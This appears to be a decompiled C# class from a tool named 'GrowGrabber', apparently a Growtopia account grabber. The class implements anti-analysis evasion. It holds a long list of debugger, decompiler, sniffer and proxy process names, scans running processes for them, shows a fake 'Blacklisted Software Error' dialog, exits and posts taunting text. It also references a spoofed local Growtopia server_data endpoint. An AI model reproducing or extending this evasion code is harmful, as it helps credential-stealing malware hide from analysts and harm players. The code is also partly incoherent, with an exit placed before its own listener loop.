using System;
using System.Diagnostics;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace GrowGrabber
{
	// Token: 0x02000009 RID: 9
	internal class hiranti
	{
		// Token: 0x0600004E RID: 78 RVA: 0x000078CC File Offset: 0x00005ACC
		private static string[] shitnames()
		{
			return new string[]
			{
				"procmon64",
				"codecracker",
				"x96dbg",
				"pizza",
				"pepper",
				"reverse",
				"reversal",
				"pc-ret",
				"crack",
				"ILSpy",
				"x32dbg",
				"sharpod",
				"x64dbg",
				"x32_dbg",
				"x64_dbg",
				"debug",
				"dbg",
				"strongod",
				"PhantOm",
				"titanHide",
				"scyllaHide",
				"ilspy",
				"graywolf",
				"simpleassemblyexplorer",
				"MegaDumper",
				"megadumper",
				"X64NetDumper",
				"x64netdumper",
				"Protection_ID",
				"protection_id",
				"die",
				"process hacker 2",
				"process",
				"hacker",
				"ollydbg",
				"x32dbg",
				"x64dbg",
				"ida -",
				"charles",
				"dnspy",
				"simpleassembly",
				"peek",
				"httpanalyzer",
				"httpdebug",
				"fiddler",
				"wireshark",
				"proxifier",
				"mitmproxy",
				"process hacker",
				"process monitor",
				"process hacker 2",
				"system explorer",
				"systemexplorer",
				"systemexplorerservice",
				"WPE PRO",
				"ghidra",
				"folderchangesview",
				"pc-ret",
				"folder",
				"dump",
				"proxy",
				"de4dotmodded",
				"StringDecryptor",
				"Centos",
				"SAE",
				"monitor",
				"brute",
				"checker",
				"zed",
				"sniffer",
				"http",
				"debugger",
				"james",
				"exeinfope",
				"codecracker",
				"x32dbg",
				"x64dbg",
				"ollydbg",
				"ida -",
				"charles",
				"dnspy",
				"simpleassembly",
				"peek",
				"httpanalyzer",
				"httpdebug",
				"fiddler",
				"wireshark",
				"dbx",
				"mdbg",
				"gdb",
				"windbg",
				"dbgclr",
				"kdb",
				"kgdb",
				"mdb"
			};
		}

		// Token: 0x0600004F RID: 79 RVA: 0x00007C30 File Offset: 0x00005E30
		public static async Task Fakanti()
		{
			hiranti.goddamn();
			bool runServer = true;
			new WebClient();
			while (runServer)
			{
				hiranti.fak.icol = "info";
				Environment.Exit(1);
				HttpListenerContext ctx = await hiranti.listener.GetContextAsync();
				HttpListenerRequest request = ctx.Request;
				HttpListenerResponse resp = ctx.Response;
				Console.WriteLine();
				new WebClient().UploadString("http://127.0.0.1", "hahaha kid? still trying hersexus??? raiter???");
				string disableSubmit = (!runServer) ? "disabled" : "";
				byte[] data = Encoding.UTF8.GetBytes(string.Format("<a>suck by hirako</a>", 0, disableSubmit));
				resp.ContentType = "text/html";
				resp.ContentEncoding = Encoding.UTF8;
				resp.ContentLength64 = (long)data.Length;
				await resp.OutputStream.WriteAsync(data, 0, data.Length);
				resp.Close();
				resp = null;
			}
		}

		// Token: 0x06000050 RID: 80 RVA: 0x00007C6D File Offset: 0x00005E6D
		public static void goddamn()
		{
			hiranti.fak.str1 = "Blacklisted Software Error";
			hiranti.fak.icol = "alert";
			hiranti.fak.str2 = "These type of softwares are not allowed while you're using GrowGrabber. ";
			hiranti.fak.ShowDialog();
		}

		// Token: 0x06000051 RID: 81 RVA: 0x00007CA8 File Offset: 0x00005EA8
		public static async void sh1tprotect(string suckname)
		{
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i < processes.Length; i++)
			{
				if (processes[i].ProcessName.Contains(suckname))
				{
					await hiranti.Fakanti();
					Form1 form = new Form1();
					form.fakmode = true;
					form.lol = true;
					hiranti.suckkk = suckname;
					break;
				}
			}
		}

		// Token: 0x04000065 RID: 101
		public static string suckkk = "";

		// Token: 0x04000066 RID: 102
		public static HttpListener listener;

		// Token: 0x04000067 RID: 103
		public string serverIp = "";

		// Token: 0x04000068 RID: 104
		public string serverport = "";

		// Token: 0x04000069 RID: 105
		private string url = "http://127.0.0.1:80/growtopia/server_data.php/";

		// Token: 0x0400006A RID: 106
		private int pageViews;

		// Token: 0x0400006B RID: 107
		private int requestCount;

		// Token: 0x0400006C RID: 108
		public static msgbox fak = new msgbox();
	}
}
